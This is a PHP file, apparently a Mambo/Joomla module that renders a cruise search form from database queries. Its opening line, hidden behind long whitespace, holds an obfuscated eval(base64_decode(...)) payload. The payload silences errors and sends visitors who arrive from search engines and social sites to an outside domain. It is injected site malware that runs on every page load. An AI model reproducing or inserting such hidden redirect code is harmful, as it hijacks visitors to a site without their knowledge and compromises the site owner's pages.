<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			     defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' );
          require_once('conn.php');

		  $option1 = ""; $t1="";
		  $option2 = ""; $t2="";
		  $option3 = ""; $t3="";
		  $sql="";

		  $schedule	= $database->getEscaped($_POST[trim(schedule)]);
          $destination	= $database->getEscaped($_POST[destination]);
          $boats	= $database->getEscaped($_POST[boats]);

		  $sql="SELECT departure_date_mm, departure_date_yyyy FROM cruise GROUP BY departure_date_yyyy, departure_date_mm";
		  $database->setQuery( $sql );
		  if (!$database->query()) {
			echo $database->stderr();
		  }

		  $recs = $database->loadObjectList();
          foreach( $recs as $data )  {
		   switch ($data->departure_date_mm) {
			case '01':
				$temp_month1 = "Jan";
				break;
			case '02':
				$temp_month1 = "Feb";
				break;
			case '03':
				$temp_month1 = "Mar";
				break;
			case '04':
				$temp_month1 = "Apr";
				break;
			case '05':
				$temp_month1 = "May";
				break;
			case '06':
				$temp_month1 = "Jun";
				break;
			case '07':
				$temp_month1 = "Jul";
				break;
			case '08':
				$temp_month1 = "Aug";
				break;
			case '09':
				$temp_month1 = "Sep";
				break;
			case '10':
				$temp_month1 = "Oct";
				break;
			case '11':
				$temp_month1 = "Nov";
				break;
			case '12':
				$temp_month1 = "Dec";
				break;
			}
			    if ($schedule==$data->departure_date_mm."-".$data->departure_date_yyyy) { $t1='Selected';}else { $t1='';};
		  		$option1 .= "<option value='".$data->departure_date_mm."-".$data->departure_date_yyyy."' $t1 >".$temp_month1." - ".$data->departure_date_yyyy."</option>";
		  }


		 $sql = "SELECT destination FROM cruise GROUP BY destination";
		 $database->setQuery( $sql );
		  if (!$database->query()) {
			echo $database->stderr();
		  }

		  $recs = $database->loadObjectList();
          foreach( $recs as $data2 )  {
		      if ($destination==$data2->destination) {$t2='Selected';}else {$t2='';}
		  	  $option2 .= "<option value='".$data2->destination."' $t2 >".$data2->destination."</option>";
		  }


		  $sql="SELECT boat_name, boat_code FROM cruise GROUP BY boat_name";
		  $database->setQuery( $sql );
		  if (!$database->query()) {
			echo $database->stderr();
		  }

		  $recs = $database->loadObjectList();
          foreach( $recs as $data3 )  {
		    if ($boats==$data3->boat_code) {$t3='Selected';}else {$t3='';}
		    $option3 .= "<option value='".$data3->boat_code."' $t3>".$data3->boat_name."</option>";
		  }

?>
<form name="searchfrm" method="post" action="<?php echo ("$mosConfig_absolute_path/data/list.php");?>">

  <table width="100%" border="0" cellspacing="5" cellpadding="0">
    <tr>
      <td> <SELECT name="schedule">
          <option value="0" >ANY Schedule ....... &gt;</option>
          <?php	                                       			 echo $option1; ?> </SELECT> </td>
    </tr>
    <tr>
      <td> <SELECT name="destination">
          <option value="0" >ANY Destination .... &gt;</option>
          <?php	                                       			 echo $option2; ?> </SELECT> </td>
    </tr>
    <tr>
      <td> <SELECT name="boats">
          <option value="0" >ANY Boat .............. &gt;</option>
          <?php	                                       			 echo $option3; ?> </SELECT> </td>
    </tr>
    <tr>
      <td> <input name="submit" type="submit" value="Search">
        | <a href="<?php echo ("$mosConfig_absolute_path/data/login.php"); ?>">Manage Cruises</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
  </table>
      </form>
